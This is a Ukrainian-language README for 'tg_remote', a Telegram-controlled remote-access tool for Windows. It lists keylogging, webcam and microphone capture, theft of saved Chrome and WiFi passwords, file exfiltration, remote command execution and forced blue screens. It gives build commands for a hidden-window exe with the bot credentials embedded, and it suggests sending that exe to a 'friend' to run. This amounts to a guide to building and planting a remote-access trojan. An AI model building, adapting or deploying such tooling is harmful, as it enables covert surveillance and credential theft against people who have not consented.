# 🖥️ tg_remote

> Повне дистанційне керування ПК через Telegram.
> Один бот — необмежена кількість комп'ютерів. Без конфліктів.

---

## ⚡ Можливості

### 📸 Медіа
- Скріншот екрану (одиночний або серія)
- Фото з вебкамери
- Запис звуку з мікрофона
- Запис відео з камери

### 🔍 Стеження
- Кейлогер (запис натискань клавіш)
- Вміст буфера обміну
- Активне вікно
- Історія браузера Chrome
- Збережені паролі Chrome

### 📁 Файли
- Перегляд файлів і папок
- Скачати файл собі в Telegram
- Видалити файл

### 🌐 Мережа
- Локальний і публічний IP
- WiFi мережі поруч
- Збережені паролі WiFi
- Активні мережеві з'єднання

### ⚙️ Система
- CPU / RAM / диск / батарея
- Список процесів
- Завершити процес
- Програми в автозапуску
- Встановлені програми

### 🖱️ Керування
- Друкувати текст на клавіатурі
- Клік мишкою по координатах
- Натиснути клавішу
- Керування гучністю
- Виконати команду в терміналі
- Відкрити сайт у браузері

### 😈 Жорсткі
- Popup повідомлення
- Змінити шпалери
- Перевернути екран
- Відкрити CD лоток
- Синій екран смерті

### 🔔 Тригери (автоматично)
- Алерт якщо CPU > 90%

---

## 🏗️ Архітектура

```
Telegram → Railway (server.py) → tg_home.exe
                               → tg_work.exe
                               → tg_friend.exe
```

Сервер отримує команди від бота і роздає їх по черзі кожному ПК.
Кожен ПК читає тільки свою чергу — конфліктів немає.

---

## 📁 Структура проекту

```
📁 tg_remote/
├── tg.py              <- клієнт (запускається на кожному ПК)
├── patch.py           <- вшиває налаштування в tg.py
├── server.py          <- сервер-роутер (деплоїться на Railway)
├── requirements.txt   <- залежності для сервера
├── railway.json       <- конфіг для Railway
└── Procfile           <- команда запуску для Railway
```

---

## 🚀 Швидкий старт

### 1. Створи Telegram бота

- Відкрий @BotFather -> /newbot -> скопіюй BOT_TOKEN
- Відкрий @userinfobot -> /start -> скопіюй свій CHAT_ID

### 2. Задеплой сервер на Railway

1. Зареєструйся на railway.app
2. Створи новий проект -> Deploy from GitHub
3. Завантаж server.py, requirements.txt, railway.json, Procfile у репо
4. Додай змінні середовища у Railway -> Variables:
   BOT_TOKEN = твій_токен
   CHAT_ID   = твій_chat_id
5. Settings -> Networking -> Generate Domain -> вкажи порт 8080
6. Скопіюй URL (наприклад https://server-xxx.up.railway.app)

### 3. Встанови вебхук

Відкрий в браузері:
https://api.telegram.org/botТВІЙ_ТОКЕН/setWebhook?url=https://ТВІЙ_URL.railway.app/webhook

Має відповісти {"ok":true}.

### 4. Збери exe

Встанови залежності:
pip install opencv-python pyautogui Pillow requests psutil pyinstaller sounddevice soundfile pynput pywin32 pycryptodome

Збери exe:
python patch.py "ТОКЕН" "CHAT_ID" "home" "https://ТВІЙ_URL.railway.app"
python -m PyInstaller --onefile --noconsole --hidden-import soundfile --hidden-import sounddevice --name "tg_home" tg_build.py

### 5. Запусти

Запусти dist\tg_home.exe — в Telegram прийде:
  home online — 14:23:01

---

## 📋 Всі команди

Формат: /команда назва_пк [аргументи]
Використай "all" замість імені щоб виконати на всіх ПК

МЕДІА
  /screenshot home          - скріншот екрану
  /screenshots home 5 3     - серія з 5 скрінів кожні 3 сек
  /webcam home              - фото з вебкамери
  /audio home 10            - запис мікрофону 10 сек
  /video home 10            - запис камери 10 сек

СТЕЖЕННЯ
  /keylog home 30           - запис клавіш 30 сек
  /clipboard home           - вміст буфера обміну
  /activewindow home        - активне вікно
  /history home             - історія Chrome
  /passwords home           - паролі Chrome

ФАЙЛИ
  /ls home C:\Users         - список файлів
  /download home C:\f.txt   - скачати файл
  /delete home C:\f.txt     - видалити файл

МЕРЕЖА
  /ip home                  - локальний + публічний IP
  /wifi home                - WiFi мережі
  /wifipass home            - паролі WiFi
  /netstat home             - активні з'єднання

СИСТЕМА
  /sysinfo home             - CPU, RAM, диск, батарея
  /processes home           - всі процеси
  /kill home chrome.exe     - завершити процес
  /startup home             - автозапуск
  /installed home           - встановлені програми

КЕРУВАННЯ
  /type home текст          - надрукувати текст
  /click home 500 300       - клік мишкою
  /key home enter           - натиснути клавішу
  /volume_up home           - гучність +10%
  /volume_down home         - гучність -10%
  /mute home                - вимкнути звук
  /run home ipconfig        - команда в терміналі
  /open home google.com     - відкрити сайт
  /lock home                - заблокувати екран
  /sleep home               - сплячий режим
  /restart home             - перезавантаження
  /shutdown home            - вимкнення

ЖОРСТКІ 😈
  /popup home Привіт!       - показати повідомлення
  /wallpaper home url       - змінити шпалери
  /flip home                - перевернути екран
  /cd home                  - відкрити CD лоток
  /bsod home                - синій екран смерті

СТАТУС
  /pcs                      - які ПК онлайн
  /stop home                - зупинити скрипт
  /help                     - меню команд

---

## 🖥️ Для кількох ПК

Для кожного нового ПК збери окремий exe:

python patch.py "ТОКЕН" "CHAT_ID" "friend" "https://ТВІЙ_URL.railway.app"
python -m PyInstaller --onefile --noconsole --name "tg_friend" tg_build.py

Скинь tg_friend.exe — він просто запускає, Python не потрібен.

---

## ⚙️ Вимоги

ОС      : Windows 10 / 11
Python  : 3.10+ (тільки для збірки)
Інтернет: потрібен на кожному ПК

---

## 📝 Ліцензія

MIT — використовуй як хочеш.
